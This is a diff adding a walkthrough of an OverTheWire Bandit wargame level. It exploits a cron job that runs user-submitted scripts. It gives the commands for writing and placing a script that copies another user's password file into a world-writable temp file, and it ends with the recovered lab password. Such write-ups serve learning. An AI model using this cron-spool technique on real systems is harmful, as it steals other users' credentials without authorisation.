@@ -1,0 +1,22 @@
+Similar to the previous few levels, in this level we once again have a cron job executing
+As with the prior levels we first look at the job cron is executing and then investigate further to find the actual script
+Here, we can see that the script is executing all user scripts in a folder and then deleting them
+So, we make a directory in the temp directory
+mkdir /tmp/mydir
+Then in that directory we make a new file
+touch exploit.sh
+We open this file in vim: vim exploit.sh
+Now we edit the file so it contains:
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/mydir/pass.txt
+
+Next we make sure our file is executable
+chmod +x exploit.sh
+Then we create pass.txt and make sure everyone can write to it
+touch pass.txt
+chmod 666 pass.txt
+Then we copy our exploit script to the directory
+cp exploit.sh /var/spool/bandit24/
+Then we wait one minute for the script to be run and then open pass.txt for our password
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
